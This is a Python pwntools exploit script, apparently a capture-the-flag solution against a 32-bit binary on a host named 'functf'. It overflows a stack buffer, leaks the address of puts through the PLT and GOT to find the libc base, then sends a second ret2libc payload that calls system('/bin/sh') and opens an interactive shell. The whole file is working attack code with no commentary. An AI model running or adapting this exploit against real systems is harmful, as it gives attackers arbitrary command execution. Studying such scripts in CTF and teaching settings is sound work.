from pwn import *

env={"LD_PRELOAD":"../r32.libc.so.6"}
libc_elf=ELF("../r32.libc.so.6")

if len(sys.argv)==1:
    p=process("linux_server",env=env)
elif sys.argv[1]=="1":
    p=process("./bin",env=env)
elif sys.argv[1]=="2":
    context.log_level='debug'
    p=process("./bin",env=env)
    print p.pid
    pause()
elif sys.argv[1]=="3":
    p=remote("functf",18003)

off_puts = libc_elf.sym["puts"]
off_system = libc_elf.sym["system"]
off_bin_sh = libc_elf.search("/bin/sh").next()
puts_plt = 0x08048420
puts_got = 0x0804A01C
ret = 0x080485F9
main = 0x0804866B 
vul  = 0x080485FA

p.recvuntil("Input :")

payload=""
payload+="A"*0x88
payload+="aaaa"
payload+=p32(puts_plt)
payload+=p32(main)
payload+=p32(puts_got)
#payload+="D"*4
p.sendline(payload)

buf=p.recvuntil("Input :")
print hexdump(buf)
libc_puts = u32(buf[0xa4:0xa4+4])
libc_base = libc_puts - off_puts
libc_system = libc_base + off_system
libc_bin_sh = libc_base + off_bin_sh

print 'libc_puts:',hex(libc_puts)
print 'libc_base:',hex(libc_base)
print 'libc_system:',hex(libc_system)
print 'libc_bin_sh:',hex(libc_bin_sh)
payload=""
payload+="B"*0x88
payload+="bbbb"
payload+=p32(libc_system)
payload+="CCCC"
payload+=p32(libc_bin_sh)
p.sendline(payload)

p.interactive()
